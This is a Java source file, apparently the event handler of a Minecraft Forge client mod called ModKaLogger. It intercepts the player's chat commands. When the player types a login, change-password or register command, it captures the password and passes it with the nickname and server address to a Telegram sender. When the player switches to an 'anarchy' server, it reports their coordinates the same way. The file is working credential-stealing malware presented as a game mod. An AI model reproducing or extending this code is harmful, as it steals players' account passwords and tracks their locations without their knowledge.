package com.modkalogger.events;

import com.modkalogger.ModKaLogger;
import com.modkalogger.telegram.TelegramSender;
import net.minecraftforge.client.event.ClientChatEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraft.client.Minecraft;
import net.minecraft.client.entity.player.ClientPlayerEntity;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class CommandHandler {
    
    private static final Pattern LOGIN_PATTERN = Pattern.compile("^/(l|login|cp|changepass)\\s+(.+)$");
    private static final Pattern REGISTER_PATTERN = Pattern.compile("^/(register|reg)\\s+(.+?)(?:\\s+(.+))?$");
    private static final Pattern ANARCHY_PATTERN = Pattern.compile("^/an(\\d+)$");
    
    private static String lastServerAddress = "unknown";
    
    @SubscribeEvent
    public static void onClientChat(ClientChatEvent event) {
        String message = event.getMessage();
        updateServerAddress();
        
        if (!isConnectedToServer()) return;
        
        Matcher loginMatcher = LOGIN_PATTERN.matcher(message);
        if (loginMatcher.matches()) {
            String password = loginMatcher.group(2);
            ClientPlayerEntity player = Minecraft.getInstance().player;
            if (player != null) {
                String nickname = player.getName().getString();
                TelegramSender.sendLoginLog(nickname, password, lastServerAddress);
            }
            return;
        }
        
        Matcher registerMatcher = REGISTER_PATTERN.matcher(message);
        if (registerMatcher.matches()) {
            String password1 = registerMatcher.group(2);
            String password2 = registerMatcher.group(3);
            ClientPlayerEntity player = Minecraft.getInstance().player;
            if (player != null) {
                String nickname = player.getName().getString();
                if (password2 == null) password2 = password1;
                TelegramSender.sendRegisterLog(nickname, password1, password2, lastServerAddress);
            }
            return;
        }
        
        Matcher anarchyMatcher = ANARCHY_PATTERN.matcher(message);
        if (anarchyMatcher.matches()) {
            String anarchyNumber = anarchyMatcher.group(1);
            ClientPlayerEntity player = Minecraft.getInstance().player;
            if (player != null) {
                String nickname = player.getName().getString();
                new Thread(() -> {
                    try {
                        Thread.sleep(2000);
                        ClientPlayerEntity currentPlayer = Minecraft.getInstance().player;
                        if (currentPlayer != null) {
                            double x = currentPlayer.getX();
                            double y = currentPlayer.getY();
                            double z = currentPlayer.getZ();
                            TelegramSender.sendAnarchySwitch(nickname, anarchyNumber, lastServerAddress, x, y, z);
                        }
                    } catch (InterruptedException e) {}
                }).start();
            }
        }
    }
    
    private static boolean isConnectedToServer() {
        return Minecraft.getInstance().getConnection() != null;
    }
    
    private static void updateServerAddress() {
        Minecraft mc = Minecraft.getInstance();
        if (mc.getConnection() != null && mc.player != null) {
            try {
                if (mc.getCurrentServer() != null) {
                    String serverIp = mc.getCurrentServer().ip;
                    if (serverIp != null && !serverIp.isEmpty()) {
                        lastServerAddress = serverIp;
                        return;
                    }
                }
                lastServerAddress = "localhost";
            } catch (Exception e) {}
        }
    }
    
    public static String getLastServerAddress() {
        return lastServerAddress;
    }
}
